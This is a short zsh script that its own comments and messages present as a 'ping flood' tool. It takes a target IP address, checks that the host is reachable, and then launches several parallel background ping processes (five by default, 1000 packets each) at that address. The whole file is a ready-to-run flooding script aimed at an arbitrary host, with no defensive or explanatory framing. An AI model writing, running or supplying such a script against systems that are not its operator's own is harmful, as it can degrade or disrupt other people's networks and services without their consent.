#!/bin/zsh

# Check if IP address is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <target_ip> [thread_count]"
    echo "Example: $0 192.168.1.1 10"
    exit 1
fi

TARGET_IP=$1
THREADS=${2:-5}  # Default to 5 threads if not specified
PING_COUNT=1000  # Number of pings per thread

# Function to perform ping flood
ping_flood() {
    local thread_id=$1
    echo "Thread $thread_id started pinging $TARGET_IP"
    ping -c $PING_COUNT -i 0.2 $TARGET_IP > /dev/null 2>&1
    echo "Thread $thread_id completed"
}

# Check if target is reachable first
if ! ping -c 1 -W 2 $TARGET_IP > /dev/null 2>&1; then
    echo "Error: $TARGET_IP is not reachable"
    exit 1
fi

echo "Starting ping flood to $TARGET_IP with $THREADS threads"
echo "Each thread will send $PING_COUNT pings"

# Launch ping threads in background
for ((i=1; i<=THREADS; i++))
do
    ping_flood $i &
done

# Wait for all background processes to complete
wait

echo "Ping flood completed"
